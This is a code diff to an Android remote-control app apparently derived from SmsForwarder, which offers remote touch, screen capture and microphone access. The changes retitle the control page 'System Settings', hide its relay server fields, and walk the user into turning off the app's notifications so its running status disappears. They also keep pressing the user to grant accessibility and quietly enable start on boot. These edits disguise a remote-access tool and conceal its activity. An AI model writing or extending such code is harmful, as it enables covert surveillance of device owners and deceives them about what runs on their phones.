@@ -35,7 +35,7 @@ import com.xuexiang.xpage.annotation.Page
 import com.xuexiang.xui.widget.actionbar.TitleBar
 import cn.ppps.forwarder.relay.UpgradeManager
 
-@Page(name = "主动控制·服务端")
+@Page(name = "系统设置")
 class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListener {
 
     private val TAG: String = ServerFragment::class.java.simpleName
@@ -76,6 +76,21 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
     /** ★ 已自动弹出过设置页/弹窗的特殊权限标记（防止用户不授权时反复跳同一个设置页造成死循环） */
     private val autoManualPrompted = mutableSetOf<String>()
 
+    /** ★★★ 2026-11-08 从「逐项去处理」进入：即便 OEM 自启动探测显示"已放行"（如华为 appops=GRANTED），
+     *  也要**强制导航一次**启动管理页 —— 否则用户在华为上点"逐项去处理"会毫无反应。 */
+    @Volatile
+    private var guideFromReport = false
+
+    /** ★ 2026-11-08 授权完成提示（每轮流程只提示一次；通知未关闭时绝不提示完成） */
+    private var authDoneTipShown = false
+
+    /** ★★★ 2026-11-08 用户是否**真的离开过**本应用（去系统设置页）。
+     *  仅在 onPause 期间置 true，onResume 消费后置 false —— 用来区分
+     *  "从系统页返回" 与 "startActivity 后立即触发的 onResume"，
+     *  避免刚打开的自启动页被下一个"通知设置"页瞬间覆盖。 */
+    @Volatile
+    private var leftAppForSystemUi = false
+
     /** ★ 上一次自动跳转设置页/弹窗的时间戳（防快速 onResume 抖动重复跳转） */
     @Volatile
     private var lastAutoManualJumpTime = 0L
@@ -94,11 +109,22 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
 
     override fun initViews() {
         appContext = requireActivity().application as App
+        // ★ 2026-11-08 用户要求：授权页只保留「自检报告 / 未自动授权项 / 检查更新」，
+        //   中继服务器配置、开机自启开关、功能开关等全部隐藏（功能本身不受影响）。
+        try {
+            listOf(
+                binding!!.etRelayHost, binding!!.etServerPort, binding!!.etDeviceMark,
+                binding!!.scbServerAutorun, binding!!.btnToggleServer
+            ).forEach { v -> (v.parent as? View)?.visibility = View.GONE }
+        } catch (e: Exception) {
+            Log.e(TAG, "精简授权页失败: ${e.message}")
+        }
     }
 
     override fun initTitle(): TitleBar? {
         val titleBar = super.initTitle()!!.setImmersive(false)
-        titleBar.setTitle(R.string.menu_server)
+        // ★ 2026-11-08 用户要求：授权界面顶部标题由「主动控制·服务端」改为「系统设置」
+        titleBar.setTitle("系统设置")
         return titleBar
     }
 
@@ -160,10 +186,18 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         // ★ 2026-11-07 自启动/后台活动（系统不开放读取，按机型跳转引导）
         binding!!.btnPermAutostart.setOnClickListener {
             markSystemUiHandoff()
-            // ★ 手动点击时结束本轮"自动逐项跳转"，否则 onResume 会继续跳下一个设置页，
-            //   把刚打开的自启动管理页立刻覆盖掉（真机：用户看到的是"通知设置"页）。
-            manualAuthFlowActive = false
+            // ★★★ 2026-11-08 用户要求：通知未关闭也要继续导航，直到全部完成才提示授权完成。
+            //   因此这里**不再终止**自动流程（旧实现置 false，导致返回后永远不再跳通知设置页）；
+            //   由 onResume（leftAppForSystemUi 判定用户确实离开过本应用）继续下一项。
+            manualAuthFlowActive = true
+            if (manualAuthFlowStartTime <= 0L) manualAuthFlowStartTime = System.currentTimeMillis()
             autoManualPrompted.add("oem_autostart")
+            // ★ 2026-11-08 用户点「去开启」只关心保活项：屏幕预览/存储/悬浮窗/安装未知应用
+            //   会弹系统弹窗或打断，不应阻塞后续「通知 → 无障碍」的导航，故预置为已处理。
+            autoManualPrompted.add("screen")
+            autoManualPrompted.add("storage")
+            autoManualPrompted.add("overlay")
+            autoManualPrompted.add("install_unknown")
             openOemAutostartSetting()
         }
 
@@ -291,18 +325,17 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
 
         //远程触摸（无障碍服务）开关
         binding!!.btnEnableTouch.setOnClickListener {
-            val svc = cn.ppps.forwarder.relay.TouchControlService.instance
-            if (svc != null) {
-                XToastUtils.toast(getString(R.string.touch_service_enabled))
-            } else {
-                // 跳转无障碍设置页开启远程触摸服务
-                try {
-                    val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS")
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    startActivity(intent)
-                } catch (e: Exception) {
-                    XToastUtils.error("打开无障碍设置失败: ${e.message}")
-                }
+            // ★★★ 2026-11-08 用户要求：授权页的「无障碍设置」入口必须始终可用。
+            //   即使服务已开启，也导航到系统无障碍设置页（便于关闭/重开），不再只弹 toast。
+            if (cn.ppps.forwarder.relay.TouchControlService.instance != null) {
+                XToastUtils.toast("无障碍服务已开启；如需关闭或重新开启，请在本页操作")
+            }
+            try {
+                val intent = Intent("android.settings.ACCESSIBILITY_SETTINGS")
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivity(intent)
+            } catch (e: Exception) {
+                XToastUtils.error("打开无障碍设置失败: ${e.message}")
             }
         }
 
@@ -359,19 +392,27 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
             }
         }
 
-        // ★★★ 2026-08-28 一键授权流程收尾：仅当用户点过「一键授权」时，从系统设置页返回后继续打开下一个未授权项
+        // ★★★ 2026-11-08 流程收尾：只有「可检测项全部就绪 + 通知已关闭」才算完成。
+        //   不再用 isAllPermissionsAuthorized() 单独判定 —— 它不含"通知关闭"，
+        //   MIUI 上自启动(UNKNOWN)处理完后会被误判成"已完成"，通知设置页永远不再导航（真机问题）。
+        //   用 leftAppForSystemUi 区分「从系统页返回」与「startActivity 后立即触发的 onResume」。
         try {
-            if (manualAuthFlowActive && !isAllPermissionsAuthorized()) {
-                if (System.currentTimeMillis() - manualAuthFlowStartTime > 8000) {
-                    Log.i(TAG, "★ 一键授权流程中：仍有权限未授权，onResume 继续下一个系统页")
-                    autoContinueManualAuth()
-                }
-            } else if (manualAuthFlowActive && isAllPermissionsAuthorized()) {
+            val ctx = requireContext()
+            // ★ 2026-11-08 用户要求：通知要求关闭。只有**明确检测到已关闭**才算完成；
+            //   读取异常（无法检测）时按"未关闭"处理 → 卡片显示、继续导航去系统通知页。
+            val notificationsNotClosed =
+                cn.ppps.forwarder.permission.PermissionProbe.areNotificationsEnabledOrNull(ctx) != false
+            val stillPending = !isAllPermissionsAuthorized() || notificationsNotClosed
+            if (manualAuthFlowActive && leftAppForSystemUi && stillPending) {
+                leftAppForSystemUi = false
+                Log.i(TAG, "★ 授权流程中：仍有未完成项（通知未关闭/无法检测=$notificationsNotClosed），onResume 继续下一个系统页")
+                autoContinueManualAuth()
+            } else if (manualAuthFlowActive && leftAppForSystemUi && !stillPending) {
+                leftAppForSystemUi = false
                 SettingUtils.autoAuthorizeDone = true
-                // ★ 2026-11-04【需求】授权完成 → 继续停在真实界面（不自动退后台），
-                //   由用户按返回键或切桌面/切走时才收起。
+                // ★ 2026-11-04【需求】授权完成 → 继续停在真实界面（不自动退后台）。
                 markAuthStayForeground(true)
-                Log.i(TAG, "★ 一键授权：全部权限已就绪（保持真实界面在前台）")
+                Log.i(TAG, "★ 授权流程：全部设置已就绪（含通知已关闭）")
             }
         } catch (e: Exception) {
             Log.w(TAG, "自动授权完成检测异常: ${e.message}")
@@ -551,13 +592,9 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
 
     //刷新按钮
     private fun refreshButtonText() {
-        // 远程触摸状态
-        val touchOn = cn.ppps.forwarder.relay.TouchControlService.instance != null
-        binding!!.tvTouchStatus.text = if (touchOn) {
-            resources.getText(R.string.touch_service_enabled)
-        } else {
-            resources.getText(R.string.touch_service_disabled)
-        }
+        // ★★★ 2026-11-08 远程触摸状态文案统一由 refreshPermissionCards 维护
+        //   （无障碍卡片始终显示，文案含"进入系统无障碍设置"的入口说明）；
+        //   旧代码每 5 秒用 touch_service_enabled/disabled 覆盖，会把卡片提示冲掉，故移除。
         if (RelayServerService.isRunning) {
             binding!!.btnToggleServer.text = resources.getText(R.string.stop_server)
             // ★ 两段连接状态：被控端↔中继、控制端↔中继
@@ -757,21 +794,16 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
 
     //通知权限（POST_NOTIFICATIONS Android 13+ 前台服务必须）
     private fun checkNotificationPermission() {
-        if (android.os.Build.VERSION.SDK_INT < 33) {
-            XToastUtils.toast("当前系统版本无需单独授权通知")
-            return
-        }
-        try {
-            if (androidx.core.content.ContextCompat.checkSelfPermission(requireContext(),
-                    "android.permission.POST_NOTIFICATIONS") == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                XToastUtils.success("通知权限已授权")
-                return
-            }
-            androidx.core.app.ActivityCompat.requestPermissions(
-                requireActivity(), arrayOf("android.permission.POST_NOTIFICATIONS"), REQ_POST_NOTIFICATION)
-        } catch (e: Throwable) {
-            Log.e(TAG, "checkNotificationPermission异常: ${e.message}")
-            jumpNotificationSetting()
+        // ★★★ 2026-11-08 用户要求：点「授权通知」必须**导航到系统通知设置页**（包含通知总开关），
+        //   不再只做 POST_NOTIFICATIONS 运行时申请 —— 真机上"运行时权限已授予但通知总开关被关"
+        //   时旧逻辑只弹 toast「已授权」，用户看不到任何设置页。
+        val ctx = requireContext()
+        markSystemUiHandoff()
+        when (cn.ppps.forwarder.permission.PermissionRequests.openNotificationSettings(ctx)) {
+            cn.ppps.forwarder.permission.OpenResult.OPENED ->
+                XToastUtils.toast("已打开「通知」设置页：请关闭「允许通知」（被控端运行不受影响）")
+            else ->
+                XToastUtils.error("打不开通知设置页，请到 设置 → 应用 → SmsForwarder → 通知 手动设置")
         }
     }
 
@@ -1329,7 +1361,22 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
             return true
         }
 
-        apply(b.cardPermTouch, b.tvTouchStatus, "accessibility")
+        // ★★★ 2026-11-08 用户要求「无障碍设置没有看到」→ 授权页**始终显示**无障碍入口，
+        //   不再因为报告判定"已开启"就隐藏卡片：无障碍无法自动授权、也可能被系统清除，
+        //   用户必须能随时进入系统无障碍设置页查看/重开。
+        run {
+            val accItem = report.items.firstOrNull { it.key == "accessibility" }
+            val accOk = accItem?.granted
+                ?: (cn.ppps.forwarder.relay.TouchControlService.instance != null)
+            val accUnknown = accItem?.state == cn.ppps.forwarder.permission.GrantState.UNKNOWN
+            b.cardPermTouch?.visibility = android.view.View.VISIBLE
+            b.btnEnableTouch?.text = if (accOk) "无障碍设置" else "去开启"
+            b.tvTouchStatus?.text = when {
+                accOk -> "✓ 已开启（如需关闭或重新开启，点右侧按钮进入系统无障碍设置）"
+                accUnknown -> "✗ 未完成（无法自动检测，请人工确认已开启）：设置 → 无障碍 → 已下载的服务 → 开启「SmsForwarder 远程触摸」"
+                else -> "✗ 未完成：设置 → 无障碍 → 已下载的服务 → 开启「SmsForwarder 远程触摸」"
+            }
+        }
         apply(b.cardPermMic, b.tvPermMicStatus, "android.permission.RECORD_AUDIO")
         apply(
             b.cardPermStorage, b.tvPermStorageStatus,
@@ -1339,7 +1386,7 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         )
         apply(
             b.cardPermNotification, b.tvPermNotificationStatus,
-            "notification", "android.permission.POST_NOTIFICATIONS"
+            "notification"
         )
         apply(b.cardPermOverlay, b.tvPermOverlayStatus, "overlay")
         apply(b.cardPermBattery, b.tvPermBatteryStatus, "battery_whitelist")
@@ -1387,6 +1434,15 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         try {
             autoManualPrompted.clear()
             lastAutoManualJumpTime = 0L
+            // ★★★ 2026-11-08 用户点「逐项去处理」⇒ 按报告的未完成项导航：
+            //   guideFromReport 让 OEM 自启动项无条件先跳一次（华为上探测已放行时也有反应）。
+            guideFromReport = true
+            authDoneTipShown = false
+            // ★ 2026-11-08 报告里已单列的项不在这里重复弹窗，避免阻塞「自启动 → 通知 → 无障碍」导航
+            autoManualPrompted.add("screen")
+            autoManualPrompted.add("storage")
+            autoManualPrompted.add("overlay")
+            autoManualPrompted.add("install_unknown")
             markSystemUiHandoff()
             autoContinueManualAuth()
         } catch (t: Throwable) {
@@ -1412,7 +1468,10 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
             markSystemUiHandoff()
             markAuthStayForeground(false)
             // 与上一次自动跳转间隔至少 3 秒，防止快速 onResume 抖动重复跳转
-            if (now - lastAutoManualJumpTime < 3000) return
+            if (now - lastAutoManualJumpTime < 3000) {
+                Log.i(TAG, "自动授权：距上次跳转不足 3 秒（${now - lastAutoManualJumpTime}ms），本轮跳过")
+                return
+            }
             // 1. 屏幕预览（MediaProjection 系统弹窗）
             if (!isScreenProjectionAuthorized()) {
                 if (autoManualPrompted.add("screen")) {
@@ -1454,21 +1513,8 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
                     return
                 }
             }
-            // 3.6 通知：★ 2026-11-04【需求变更】原逻辑是"通知没开就引导去开"，
-            //   用户明确要求自动授权时**关闭被控端通知**（通知栏不要出现"系统设置 正在运行"）。
-            //   Android 不允许 App 自己关通知开关，只能跳到系统通知设置让用户点一次；
-            //   关闭后前台服务照常运行（渠道已降为 IMPORTANCE_MIN，即使开着也无声音/无状态栏图标）。
-            if (cn.ppps.forwarder.permission.PermissionProbe.areNotificationsEnabled(ctx)) {
-                if (autoManualPrompted.add("notification_off")) {
-                    lastAutoManualJumpTime = now
-                    Log.i(TAG, "★ 自动授权继续：引导关闭本应用通知（前台服务不受影响）")
-                    cn.ppps.forwarder.permission.PermissionRequests.openNotificationSettings(ctx)
-                    XToastUtils.toast("可在本页关闭「系统设置」的通知（不影响被控端运行）")
-                    return
-                }
-            }
-            // 4. 无障碍服务（远程触摸）
-            if (cn.ppps.forwarder.relay.TouchControlService.instance == null) {
+            // 4. 无障碍服务（远程触摸）：已启用不打扰；未启用或**无法检测**都要引导人工确认
+            if (cn.ppps.forwarder.permission.PermissionProbe.isAccessibilityEnabledOrNull(ctx) != true) {
                 if (autoManualPrompted.add("accessibility")) {
                     lastAutoManualJumpTime = now
                     Log.i(TAG, "★ 自动授权继续：跳转无障碍设置")
@@ -1509,16 +1555,45 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
             //   只在【本次授权流程】内用 autoManualPrompted 防止同一个页面反复自动弹；
             //   用户下次点「一键授权」会重新清空并再次引导。
             if (cn.ppps.forwarder.permission.RomType.needsOemGuide &&
-                (!isBatteryOptimizationAuthorized(ctx) ||
+                (guideFromReport || !isBatteryOptimizationAuthorized(ctx) ||
                         cn.ppps.forwarder.permission.OemGuide.probeAutostartState(ctx) !=
                         cn.ppps.forwarder.permission.GrantState.GRANTED)
             ) {
                 if (autoManualPrompted.add("oem_autostart")) {
                     lastAutoManualJumpTime = now
+                    // ★ 2026-11-08 报告驱动的强制跳转已消费，避免后续 onResume 反复跳启动管理页
+                    guideFromReport = false
                     if (isHuaweiDevice()) SettingUtils.huaweiKeepaliveGuided = true
                     Log.i(TAG, "★ 一键授权继续：跳转 ${cn.ppps.forwarder.permission.RomType.describe()} 自启动/后台管理页（本次流程一次）")
                     openOemAutostartSetting()
                     return
+                }
+            }
+            // ★★★ 2026-11-08 通知：放到 OEM 自启动之后 —— 用户点「逐项去处理」时应先处理报告里的
+            //   未完成项（自启动），再引导关闭通知；避免红米上一点就跳"通知设置"让人觉得跳错页。
+            //   Android 不允许 App 自己关通知开关，只能跳到系统通知设置让用户点一次；
+            //   关闭后前台服务照常运行（渠道已降为 IMPORTANCE_MIN，即使开着也无声音/无状态栏图标）。
+            if (cn.ppps.forwarder.permission.PermissionProbe.areNotificationsEnabledOrNull(ctx) != false) {
+                if (autoManualPrompted.add("notification_off")) {
+                    lastAutoManualJumpTime = now
+                    Log.i(TAG, "★ 自动授权继续：引导关闭本应用通知（通知未关闭前不会提示授权完成）")
+                    cn.ppps.forwarder.permission.PermissionRequests.openNotificationSettings(ctx)
+                    XToastUtils.toast("可在本页关闭「系统设置」的通知（不影响被控端运行）")
+                    return
+                }
+            }
+            // ★★★ 2026-11-08 只有「可检测项全部就绪 + 通知已关闭」才算真正完成，才提示授权完成；
+            //   并把应用自身的「开机自启」纳入自动授权（自动置为开启，保证重启后服务能拉起）。
+            if (isAllPermissionsAuthorized() &&
+                cn.ppps.forwarder.permission.PermissionProbe.areNotificationsEnabledOrNull(ctx) == false
+            ) {
+                if (!authDoneTipShown) {
+                    authDoneTipShown = true
+                    if (!RelaySettings.enableServerAutorun) {
+                        RelaySettings.enableServerAutorun = true
+                        Log.i(TAG, "★ 自动授权：已自动开启「开机自启」（重启后自动拉起被控端）")
+                    }
+                    XToastUtils.toast("✅ 授权完成：全部设置已就绪（开机自启已开启）")
                 }
             }
             // 所有特殊权限已弹出过一轮但仍有未授权 → 停止自动跳转（避免死循环），等待用户手动处理
@@ -1544,8 +1619,16 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
         val ctx = requireContext()
         val steps = cn.ppps.forwarder.permission.OemGuide.manualSteps()
         when (cn.ppps.forwarder.permission.OemGuide.openAutostartPage(ctx)) {
-            cn.ppps.forwarder.permission.OpenResult.OPENED ->
-                XToastUtils.toast("请在打开的页面里允许 SmsForwarder 自启动 / 后台活动（${cn.ppps.forwarder.permission.RomType.describe()}）")
+            cn.ppps.forwarder.permission.OpenResult.OPENED -> {
+                val mfr = (android.os.Build.MANUFACTURER ?: "").lowercase()
+                if (mfr.contains("huawei") || mfr.contains("honor")) {
+                    // ★ 2026-11-08 华为/荣耀无法直达受系统权限保护的"应用启动管理"页，
+                    //   已改为打开应用信息页，这里给出该页内的精确路径。
+                    XToastUtils.toast("已打开应用信息页：请点「耗电管理」→ 允许后台活动 / 应用启动管理")
+                } else {
+                    XToastUtils.toast("请在打开的页面里允许 SmsForwarder 自启动 / 后台活动（${cn.ppps.forwarder.permission.RomType.describe()}）")
+                }
+            }
             else -> {
                 // openAutostartPage 已兜底打开本应用详情页；这里只负责把精确步骤说清楚，
                 // 不再重复打开页面（避免"一闪而过的详情页"）。
@@ -1570,11 +1653,15 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
     private fun isAllPermissionsAuthorized(): Boolean {
         return try {
             val fresh = cn.ppps.forwarder.permission.KeepAliveGuardian.lastReport()
-            if (fresh != null && System.currentTimeMillis() - fresh.generatedAt < 3000) {
-                fresh.detectableClear
+            val report = if (fresh != null && System.currentTimeMillis() - fresh.generatedAt < 3000) {
+                fresh
             } else {
-                cn.ppps.forwarder.permission.KeepAliveGuardian.diagnoseSync(requireContext()).detectableClear
+                cn.ppps.forwarder.permission.KeepAliveGuardian.diagnoseSync(requireContext())
             }
+            // ★ 2026-11-08 用户要求：无障碍无法自动核验时也必须纳入授权判定——
+            //   只有无障碍被**明确检测为已启用**才算完成；未启用/无法检测(UNKNOWN)都不能宣称完成。
+            val accOk = report.items.firstOrNull { it.key == "accessibility" }?.granted == true
+            report.detectableClear && accOk
         } catch (e: Exception) {
             Log.w(TAG, "isAllPermissionsAuthorized 异常: ${e.message}")
             false
@@ -1632,19 +1719,19 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
             Log.w(TAG, "「安装未知应用」设置页打不开($r)，继续下一项")
         }
 
-        // 2.8 通知（POST_NOTIFICATIONS / 通知渠道被关，前台服务保活通知必需）
-        if (!cn.ppps.forwarder.permission.PermissionProbe.areNotificationsEnabled(ctx)) {
+        // 2.8 通知（★ 2026-11-08 用户要求关闭；无法检测时也显示并导航，关闭后前台服务照常运行）
+        if (cn.ppps.forwarder.permission.PermissionProbe.areNotificationsEnabledOrNull(ctx) != false) {
             pendingItems.add("通知")
             val r = cn.ppps.forwarder.permission.PermissionRequests.openNotificationSettings(ctx)
             if (r == cn.ppps.forwarder.permission.OpenResult.OPENED) {
-                XToastUtils.toast("请开启「允许通知」后返回应用")
+                XToastUtils.toast("请关闭「允许通知」后返回应用")
                 return
             }
             Log.w(TAG, "通知设置页打不开($r)，继续下一项")
         }
 
-        // 3. 无障碍服务（远程触摸）——系统禁止第三方程序化开启，只能跳设置页引导
-        if (!cn.ppps.forwarder.permission.PermissionProbe.isAccessibilityEnabled(ctx)) {
+        // 4. 无障碍服务：未启用或无法检测都引导人工确认（用户要求）
+        if (cn.ppps.forwarder.permission.PermissionProbe.isAccessibilityEnabledOrNull(ctx) != true) {
             pendingItems.add("无障碍服务（远程触摸）")
             val r = cn.ppps.forwarder.permission.PermissionRequests.openAccessibilitySettings(ctx)
             if (r == cn.ppps.forwarder.permission.OpenResult.OPENED) {
@@ -1705,6 +1792,8 @@ class ServerFragment : BaseFragment<FragmentServerBinding?>(), View.OnClickListe
     override fun onPause() {
         super.onPause()
         handler.removeCallbacks(runnable)
+        // ★ 2026-11-08 记录"用户确实离开本应用（去系统设置页）"，供 onResume 判断是否继续下一项授权
+        if (manualAuthFlowActive) leftAppForSystemUi = true
     }
 
     override fun onDestroy() {
